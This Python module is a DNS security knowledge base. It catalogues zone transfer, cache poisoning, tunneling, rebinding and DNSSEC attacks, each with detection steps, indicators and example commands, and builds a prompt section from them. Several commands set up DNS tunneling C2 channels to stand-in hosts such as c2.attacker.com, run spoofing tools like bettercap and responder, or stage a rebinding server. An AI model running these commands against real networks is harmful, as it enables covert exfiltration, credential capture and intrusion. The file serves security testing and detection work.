"""DNS security knowledge base.

Attack patterns for DNS infrastructure:
1. DNS Zone Transfer & Enumeration — AXFR, brute force, NSEC walking
2. DNS Spoofing & Cache Poisoning — Kaminsky, TXID prediction
3. DNS Tunneling & Exfiltration — data encoding in queries
4. DNS Rebinding — bypassing same-origin via TTL manipulation
5. DNSSEC Attacks — key compromise, downgrade, zone enumeration
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Any

import structlog

logger = structlog.get_logger()


class DNSAttackType(str, Enum):
    ZONE_TRANSFER = "zone_transfer"
    SPOOFING = "spoofing"
    TUNNELING = "tunneling"
    REBINDING = "rebinding"
    DNSSEC = "dnssec"


@dataclass
class DNSPattern:
    name: str = ""
    attack_type: DNSAttackType = DNSAttackType.ZONE_TRANSFER
    description: str = ""
    detection_strategies: list[str] = field(default_factory=list)
    indicators: list[str] = field(default_factory=list)
    tools: list[str] = field(default_factory=list)
    commands: list[str] = field(default_factory=list)
    severity: str = "high"

    def to_dict(self) -> dict[str, Any]:
        return {"name": self.name, "type": self.attack_type.value, "severity": self.severity}


DNS_PATTERNS: list[DNSPattern] = [
    DNSPattern(
        name="DNS Zone Transfer & Enumeration",
        attack_type=DNSAttackType.ZONE_TRANSFER,
        description="Attempting DNS zone transfers (AXFR) to dump entire zone records, brute-forcing subdomains, and NSEC/NSEC3 walking for DNSSEC-enabled zones to enumerate all records.",
        detection_strategies=[
            "Attempt AXFR against all authoritative nameservers",
            "Brute force subdomains with comprehensive wordlists",
            "NSEC walk to enumerate DNSSEC-signed zones",
            "Check for wildcard DNS records",
            "Reverse DNS sweep of IP ranges for PTR records",
            "Certificate Transparency log mining for subdomains",
            "Check DNS TXT records for SPF, DKIM, DMARC info leakage",
            "Analyze SOA record for internal naming conventions",
        ],
        indicators=[
            "AXFR query succeeds (zone transfer allowed)",
            "Large number of DNS queries for non-existent subdomains",
            "Sequential NSEC record queries (zone walking)",
            "PTR records revealing internal hostnames",
        ],
        tools=["dig", "dnsrecon", "fierce", "dnsenum", "subfinder", "amass", "massdns"],
        commands=[
            "dig axfr @ns1.target.com target.com",
            "dnsrecon -d target.com -t axfr,std,brt",
            "fierce --domain target.com --subdomains subdomains.txt",
            "subfinder -d target.com -all -o subs.txt",
            "amass enum -d target.com -passive -o amass_out.txt",
            "massdns -r resolvers.txt -t A -o S -w massdns_out.txt subdomains.txt",
        ],
        severity="high",
    ),
    DNSPattern(
        name="DNS Spoofing & Cache Poisoning",
        attack_type=DNSAttackType.SPOOFING,
        description="Poisoning DNS resolver caches via Kaminsky-style attacks, birthday attacks on TXID, and rogue DNS server deployment on local network.",
        detection_strategies=[
            "Check if DNS resolver uses source port randomization",
            "Verify DNSSEC validation is enabled on resolvers",
            "Test for DNS cache poisoning vulnerability (TXID space)",
            "Check for rogue DNS servers on local network (ARP/DHCP)",
            "Monitor for mismatched DNS responses (extra records)",
            "Test resolver for Bailiwick checking compliance",
            "Check for DNS response rate limiting",
            "Verify DNS-over-HTTPS/TLS enforcement",
        ],
        indicators=[
            "DNS resolver using predictable source ports",
            "DNSSEC validation disabled or not enforced",
            "Unexpected DNS responses with additional records",
            "Rogue DHCP server pushing attacker DNS",
            "DNS responses from non-authoritative sources",
        ],
        tools=["bettercap", "ettercap", "dnsspoof", "responder"],
        commands=[
            "bettercap -T target -X --dns dns_spoof.cfg",
            "responder -I eth0 -wrf",
            "dig +short +identify target.com @resolver",
            "dig +dnssec target.com | grep -i 'ad\\|rrsig'",
            "nmap --script dns-cache-snoop.nse -p 53 resolver_ip",
        ],
        severity="critical",
    ),
    DNSPattern(
        name="DNS Tunneling & Exfiltration",
        attack_type=DNSAttackType.TUNNELING,
        description="Using DNS queries/responses as covert communication channel: encoding data in subdomain labels, TXT records, or NULL records to bypass firewalls.",
        detection_strategies=[
            "Monitor for unusually long subdomain labels (>30 chars)",
            "Check for high volume of TXT/NULL record queries",
            "Analyze query entropy (base32/base64 encoded subdomains)",
            "Monitor for queries to single domain with many unique subdomains",
            "Check for consistent query timing patterns (beaconing)",
            "Analyze query/response size ratios for anomalies",
            "Monitor for DNS queries from unexpected processes",
            "Check for queries bypassing corporate DNS (direct to external)",
        ],
        indicators=[
            "Subdomain labels with base32/base64 encoding patterns",
            "Thousands of unique subdomain queries to single domain",
            "High TXT record query volume to non-mail domain",
            "DNS queries originating from non-browser processes",
            "Regular beacon pattern in DNS query timing",
        ],
        tools=["dnscat2", "iodine", "dns2tcp", "cobaltstrike-dns"],
        commands=[
            "dnscat2 --dns server=c2.attacker.com --secret=key123",
            "iodine -f -P password c2dns.attacker.com 10.0.0.1",
            "dns2tcp -z c2.attacker.com -d 1 -f dns2tcp.conf",
            "tcpdump -i eth0 port 53 -w dns_capture.pcap",
            "tshark -r dns_capture.pcap -T fields -e dns.qry.name | sort -u | wc -l",
        ],
        severity="high",
    ),
    DNSPattern(
        name="DNS Rebinding",
        attack_type=DNSAttackType.REBINDING,
        description="Bypassing same-origin policy by manipulating DNS TTL: first resolve to attacker IP to serve malicious JS, then rebind to internal IP to access internal services from victim browser.",
        detection_strategies=[
            "Check web apps for DNS rebinding protections (Host header validation)",
            "Test internal services for Host header enforcement",
            "Verify DNS pinning in HTTP clients and browsers",
            "Check if internal APIs validate Origin/Referer headers",
            "Test with short-TTL DNS records pointing to internal IPs",
            "Check for CORS misconfiguration enabling rebinding",
            "Verify firewall blocks outbound DNS to untrusted resolvers",
            "Test browser DNS cache behavior with TTL=0 records",
        ],
        indicators=[
            "DNS record with TTL=0 or very short TTL",
            "Same domain resolving to different IPs in short timeframe",
            "Internal IP (10.x, 172.16.x, 192.168.x) in DNS response",
            "Browser making requests to internal services via external domain",
            "CORS headers allowing arbitrary origins",
        ],
        tools=["singularity", "rbndr", "whonow", "rebinder"],
        commands=[
            "singularity-server -RebsHost attacker.com -ResponseIPAddr 192.168.1.1",
            "dig +short target-rebind.attacker.com  # should alternate IPs",
            "curl -H 'Host: evil.com' http://internal-service/api/",
            "nslookup -type=A rebind.attacker.com  # check TTL=0",
        ],
        severity="high",
    ),
    DNSPattern(
        name="DNSSEC Attacks",
        attack_type=DNSAttackType.DNSSEC,
        description="Attacking DNSSEC infrastructure: key compromise, algorithm downgrade, NSEC3 hash zone enumeration, and KSK/ZSK rollover exploitation.",
        detection_strategies=[
            "Check DNSSEC signature algorithms for weak choices (RSA-1024)",
            "Verify KSK/ZSK key rotation schedule is followed",
            "Test for NSEC3 zone enumeration (offline hash cracking)",
            "Check for expired or soon-to-expire DNSKEY records",
            "Verify DS records in parent zone match child DNSKEY",
            "Test for algorithm downgrade by stripping DNSSEC records",
            "Check NSEC3 iterations count (too low = enumerable)",
            "Verify chain of trust from root to target zone",
        ],
        indicators=[
            "DNSSEC using RSA-1024 or SHA-1 algorithms",
            "Expired RRSIG signatures in DNS responses",
            "NSEC3 with low iteration count and no salt",
            "Missing DS record in parent zone",
            "DNSKEY TTL mismatch with zone SOA",
        ],
        tools=["dnsviz", "ldns-utils", "nsec3map", "delv"],
        commands=[
            "delv @resolver target.com +root=root.key",
            "dig +dnssec +multi target.com DNSKEY",
            "dig +dnssec target.com | grep -i algorithm",
            "ldns-walk target.com",
            "nsec3map -d target.com -o nsec3_hashes.txt",
        ],
        severity="medium",
    ),
]


def build_dns_security_prompt(focus_type: DNSAttackType | None = None, max_patterns: int = 5) -> str:
    lines = ["## DNS Security Knowledge\n"]
    patterns = DNS_PATTERNS
    if focus_type:
        patterns = [p for p in patterns if p.attack_type == focus_type]
    for pattern in patterns[:max_patterns]:
        lines.append(f"### {pattern.name} [{pattern.severity}]")
        lines.append(pattern.description)
        lines.append("\nDetection:")
        for s in pattern.detection_strategies[:4]:
            lines.append(f"  - {s}")
        lines.append("\nIndicators:")
        for i in pattern.indicators[:3]:
            lines.append(f"  - {i}")
        lines.append("\nCommands:")
        for c in pattern.commands[:3]:
            lines.append(f"  $ {c}")
        lines.append("")
    return "\n".join(lines)
